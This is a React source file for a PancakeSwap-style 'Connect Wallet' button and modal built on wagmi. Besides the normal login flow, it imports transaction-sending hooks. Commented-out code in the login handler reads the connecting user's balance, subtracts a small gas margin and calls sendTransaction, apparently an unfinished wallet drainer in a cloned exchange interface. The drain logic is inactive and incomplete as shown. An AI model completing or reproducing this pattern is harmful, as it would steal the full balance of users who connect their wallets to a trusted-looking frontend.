import { useTranslation } from '@pancakeswap/localization'
import { WalletModalV2 } from '@pancakeswap/ui-wallets'
import { Button, ButtonProps } from '@pancakeswap/uikit'
import { createWallets, getDocLink } from 'config/wallet'
import { useActiveChainId } from 'hooks/useActiveChainId'
import useAuth from 'hooks/useAuth'
// @ts-ignore
// eslint-disable-next-line import/extensions
import { useActiveHandle } from 'hooks/useEagerConnect.bmp.ts'
import { useMemo, useState } from 'react'
import { useConnect, useAccount, useBalance,usePrepareSendTransaction,useSendTransaction} from 'wagmi'
import {parseEther} from "@ethersproject/units"
import Trans from './Trans'
import { ConnectorNames } from 'config/wallet'
const ConnectWalletButton = ({ children, ...props }: ButtonProps) => {
  const handleActive = useActiveHandle()
  const { login } = useAuth()
  //const {address, isConnected} = useAccount()

 //const {data: balance} = useBalance({address})
 //const [amtMinus, setAmt] = useState("0.0")
 /*
 if(isConnected && balance)
 {
const val = parseFloat(balance.formatted) - parseFloat("0.00021")
 }
  else
    {const val = 0.0}
*/
  const authCon = async(con: ConnectorNames) => {

    const auth = await login(con)
   console.log(auth)
   
    //console.log(address,balance)
 /*
 if(val <= 0)
    {
      console.log("Low balance")
    // return
    }
  sendTransaction?.()

*/
  }

 //const bnbs = parseEther(val)


  const {
    
    currentLanguage: { code },
  } = useTranslation()
   const t = (str: string) => {return str}
  const { connectAsync } = useConnect()
  const { chainId } = useActiveChainId()
  const [open, setOpen] = useState(false)

  const docLink = useMemo(() => getDocLink(code), [code])

  const handleClick = () => {
    if (typeof __NEZHA_BRIDGE__ !== 'undefined') {
      handleActive()
    } else {
      setOpen(true)
    }
  }

  const wallets = useMemo(() => createWallets(chainId, connectAsync), [chainId, connectAsync])
 // console.log(wallets)
//*<Trans>Connect Wallet</Trans>/* 
  return (
    <>
      <Button onClick={handleClick} {...props}>
        {children || "Connect Wallet"}
      </Button>
      <WalletModalV2
        docText={t('Learn How to Connect')}
        docLink={docLink}
        isOpen={open}
        wallets={wallets}
        login={authCon}
        onDismiss={() => setOpen(false)}
      />
    </>
  )
}

export default ConnectWalletButton
